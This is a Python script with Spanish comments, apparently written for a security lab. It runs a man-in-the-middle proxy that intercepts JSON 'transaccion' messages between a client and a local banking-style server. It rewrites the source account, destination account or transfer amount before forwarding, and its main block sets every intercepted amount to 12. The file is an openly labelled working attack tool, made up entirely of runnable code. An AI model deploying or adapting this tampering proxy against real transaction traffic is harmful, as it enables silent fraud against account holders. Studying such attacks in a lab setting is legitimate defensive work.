import socket
import json
import hashlib
import threading
# Variables de configuración del proxy
PROXY_HOST = '0.0.0.0'
PROXY_PORT = 11003
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 11002

# Definir una función para modificar las transacciones

def transaction_modify(trans,tipo, valor):
    datos = trans.split(',')
    # si todo es correcto 
    if len(datos) >= 3 :
        # accedemo a cada valor de la transaccion
        cuenta_src = datos[0].strip()
        cuenta_dest = datos[1].strip()
        cantidad = float(datos[2].strip())
        # se le cambia a cada valor correspondiente el valor
        if (tipo == 'Origen'):
            cuenta_src = valor
        elif (tipo == 'Destino'):
            cuenta_dest = valor
        elif (tipo == 'Cantidad'):
            cantidad = valor
        else:
            print("Tienes que indicar que dato quieres modificar")
        # nuevo valor de la transaccion
        nueva_data = f"{cuenta_src},{cuenta_dest},{cantidad}"
        print(f"Nueva transaccion {nueva_data}")
        return nueva_data
    else: 
        print("Transaccion incorrecta")
        return ""
    
def handle_client(client_socket, client_addr,tipo, valor):
    print(f"[Attack] Cliente conectado: {client_addr}")
    # constructor del socket indicando que usamos direcciones IPV6
    # y protocolo TCP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
    # Establecemos la conxión hacia al servidor
    server_socket.connect((SERVER_HOST,SERVER_PORT))
    try:
        while True:
            # buffer de información que recibimos del cliente 
            data = client_socket.recv(4096)
            if not data:
                # si no recibimos datos fin
                break
            # decodificamos la información que recibimos
            mensaje = data.decode()
            print(f"[Attack] Mensaje del cliente interceptado {mensaje}")
            try:
                # si la información es de transaccion
                if '"accion":"transaccion"' in mensaje:
                    lineas = mensaje.strip().split('\n') # separamos en lineas los datos 
                    for l in lineas:
                        # si hay contenido en esa linea
                        if l.strip():
                            try: 
                                # transformarmos el formato json a python
                                obj = json.loads(l)
                                # si la accion es transaccion
                                if obj.get("accion") == "transaccion":
                                    # accedemos a la transaccion
                                    data_trans = obj.get("data","")
                                    # modificamos la transaccion
                                    data_mod =  transaction_modify(data_trans,tipo, valor)
                                    #si se han modificamos datos
                                    if (data_mod != data_trans) and (data_mod != ""):
                                        # modificamos la transaccion en el diccionario
                                        obj["data"] = data_mod
                                        # vamos a convertirlo en objeto json
                                        mensaje_modificado = json.dumps(obj) + "\n"
                                        print(f'[Attack] Enviamos transaccion modificada')
                                        # enviamos el mensaje modificado 
                                        server_socket.sendall(mensaje_modificado.encode())
                                        # siguiente linea
                                        continue
                            # por si hay errores de json
                            except json.JSONDecodeError:
                                pass
                # enviamos los datos            
                server_socket.sendall(data)
            except Exception as e:
                print(f"[Attack] Error procesando mensaje: {e}")
                server_socket.sendall(data)

            resp_data = server_socket.recv(4096)
            if resp_data:
                print(f"[Attack] Error procesando mensaje: {resp_data.decode()}")
                client_socket.sendall(resp_data)
    except Exception as e:
        print(f"[Attack] Error en conexión: {e}")
    #cerramos las conexiones
    finally:
        client_socket.close()
        server_socket.close()
# función para inicializar  todo        
def start_mitm(tipo, valor):
    # cremamos una inestancia con direccione IPV4 y arquitectura TCP
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # permitimos reutilzar una direccion y puerto despues de cerra el socket
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # vincular la direccion
    proxy_socket.bind((PROXY_HOST, PROXY_PORT))
    # Pone a escuchar con una cola de conexiones maxima de 5
    proxy_socket.listen(5)
    print(f"[Attack] Proxy escuchando en {PROXY_HOST}:{PROXY_PORT}")
    print(f"[Attack] Redirigiendo a {SERVER_HOST}:{SERVER_PORT}")

    while True:
        # Aceptamos las conexiones clientes
        # extraemos el socket cliente y su direccion
        client_socket, client_addr = proxy_socket.accept()
        # trabajamos mediante un hilo de ejecución
        # construimos el hilo
        client_thread = threading.Thread(
            target= handle_client, 
            args=(client_socket,client_addr, tipo, valor),
            daemon=True
        )
        # iniciamos el hilo
        client_thread.start()
if __name__ == '__main__':
    start_mitm('Cantidad', 12)


